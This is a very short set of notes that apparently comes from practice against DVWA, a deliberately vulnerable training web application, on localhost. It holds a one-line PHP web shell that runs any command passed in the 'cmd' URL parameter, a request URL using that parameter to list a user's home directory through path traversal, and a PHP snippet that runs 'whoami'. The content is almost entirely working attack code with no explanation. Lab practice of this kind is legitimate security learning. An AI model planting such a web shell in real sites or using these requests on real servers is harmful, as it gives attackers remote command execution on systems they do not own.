<?php 
system($_GET['cmd']);
?>

127.0.0.1/dvwa/vulnerabilities/cmd.php?cmd=dir..\..\..\..\..\Users\venkatreddy.s\


<?php
$output = `whoami`;
echo "<pre>$output</pre>";
?>